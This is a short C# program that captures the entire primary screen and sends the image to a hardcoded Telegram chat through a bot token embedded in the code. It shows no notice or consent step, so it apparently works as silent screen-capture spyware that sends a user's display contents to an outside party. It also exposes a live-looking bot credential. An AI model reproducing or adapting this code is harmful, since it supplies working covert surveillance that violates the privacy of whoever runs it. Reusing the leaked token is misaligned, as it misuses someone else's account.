using System.Drawing.Imaging;
using System.Drawing;
using System.Runtime.InteropServices;
using Telegram.Bot;
using Telegram.Bot.Types.InputFiles;


namespace WindowScreenshot
{
    internal class Program
    {
        private static ITelegramBotClient _botClient;

        static async Task Main(string[] args)
        {
            _botClient = new TelegramBotClient("6530285040:AAFOZe4HLj89L-yHVkyJLKrtqO9H2PSpxx4");

            Rectangle screenBounds = GetPrimaryScreenBounds();
            using Bitmap screenshot = new(screenBounds.Width, screenBounds.Height);

            using var graphics = Graphics.FromImage(screenshot);
            graphics.CopyFromScreen(screenBounds.Location, Point.Empty, screenBounds.Size);

            using var ms = new MemoryStream();
            screenshot.Save(ms, ImageFormat.Png);
            byte[] imageBytes = ms.ToArray();
            var base64Image = Convert.ToBase64String(imageBytes);

            _botClient.StartReceiving();

            InputOnlineFile photo = new InputOnlineFile(new MemoryStream(imageBytes), "screnshoot.jpg");

            await _botClient.SendPhotoAsync(2017110018,photo);
        }

        [DllImport("user32.dll")]
        static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("user32.dll")]
        static extern int GetSystemMetrics(int nIndex);

        public const int SM_CXSCREEN = 0;
        public const int SM_CYSCREEN = 1;

        static Rectangle GetPrimaryScreenBounds()
        {
            IntPtr desktopWindow = GetDesktopWindow();
            IntPtr hdc = GetDC(desktopWindow);

            int screenWidth = GetSystemMetrics(SM_CXSCREEN);
            int screenHeight = GetSystemMetrics(SM_CYSCREEN);

            ReleaseDC(desktopWindow, hdc);

            return new Rectangle(0, 0, screenWidth, screenHeight);
        }
    }
}
